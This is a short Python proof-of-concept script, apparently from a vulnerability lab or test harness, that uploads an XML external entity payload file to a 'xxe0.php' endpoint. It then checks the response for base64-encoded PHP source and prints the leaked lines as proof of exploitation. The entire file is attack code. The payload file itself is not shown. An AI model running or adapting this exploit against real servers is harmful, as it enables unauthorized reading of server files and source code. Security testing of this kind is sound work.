#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests

from consts import *
import sys

target += "xxe0.php"

def main ():
    print("[*] Sending payload on target")
    r = requests.post(target, files={"untrusted": open("xxe.xml", "rb")})
    if "PD9waHAgZXJyb3JfcmVwb3J0a" in r.text:
        print("[*] Payload executed successfully")
        print("[*] PoC:")

        for line in r.text.split('\n'):
            if "PD9waHAgZXJyb3JfcmVwb3J0a" in line:
                print(line)
        sys.exit(1)
    else:
        print("[*] Attack failed")
        sys.exit(0)

if __name__ == '__main__':
    main()